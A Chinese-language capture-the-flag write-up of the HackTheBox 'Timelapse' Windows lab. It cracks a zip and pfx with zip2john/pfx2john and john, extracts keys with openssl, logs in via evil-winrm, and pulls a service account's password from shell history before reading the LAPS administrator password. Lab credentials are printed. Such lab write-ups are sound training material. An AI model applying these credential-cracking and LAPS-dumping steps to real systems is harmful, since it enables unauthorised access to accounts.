---
title: HackTheBox-Timelaps-Windows_Active
date: 2025-04-27 20:00:00
tags: 红队
categories: 红队打靶-Windows_Active
---



# 信息收集

## nmap-端口扫描

![image-20250427101212742](./Timelaps-Windows_active/image-20250427101212742.png)

## 445-SMB

![image-20250427103034721](./Timelaps-Windows_active/image-20250427103034721.png)

![image-20250427103045776](./Timelaps-Windows_active/image-20250427103045776.png)

smb中有个zip文件下载到本地，解压需要密码，使用zip2john将zip文件转化为hash然后使用john破解密码

```shell
zip2john winrm_backup.zip >> winrm.hash
john --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash
```

![image-20250427103107609](./Timelaps-Windows_active/image-20250427103107609.png)

```
supremelegacy
```

解压zip文件之后是个pfx文件，pfx文件中有证书，私钥，公钥，可以使用openssl提取,提取时需要密码，可以使用pfx2john破解，和zip2john破解是一样的步骤

```shell
pfx2john legacyy_dev_auth.pfx >> legacyy.hash
john --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20250427104200706](./Timelaps-Windows_active/image-20250427104200706.png)

```txt
thuglegacy
```

pfx文件中包含公钥，私钥，证书，可以使用openssl提取

```shell
提取证书
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out server.pem
提取私钥
openssl rsa -in server.pem -out prv.key
提取公钥
openssl x509 -in server.pem -out pub.crt
```

![image-20250427110620631](./Timelaps-Windows_active/image-20250427110620631.png)

![image-20250427110634364](./Timelaps-Windows_active/image-20250427110634364.png)

# get-shell

evil-winrm支持使用公私钥连接

![image-20250427110648005](./Timelaps-Windows_active/image-20250427110648005.png)

查看命令行历史记录，其中有svc_deploy用户的凭证

![image-20250427110659126](./Timelaps-Windows_active/image-20250427110659126.png)

```
svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```

## 提权

svc_deploy用户是LAPS_Readers组成员，允许读取LAPS，直接读取管理员密码

![image-20250427114128008](./Timelaps-Windows_active/image-20250427114128008.png)

![image-20250427114100783](./Timelaps-Windows_active/image-20250427114100783.png)

```
Administrator:8T0xR+)@Q[yzD$G9]!$X$F{P
```

![image-20250427114358941](./Timelaps-Windows_active/image-20250427114358941.png)

也可以使用脚本获取LAPS

[n00py/LAPSDumper: Dumping LAPS from Python](./https://github.com/n00py/LAPSDumper/tree/main)

![image-20250427114943587](./Timelaps-Windows_active/image-20250427114943587.png)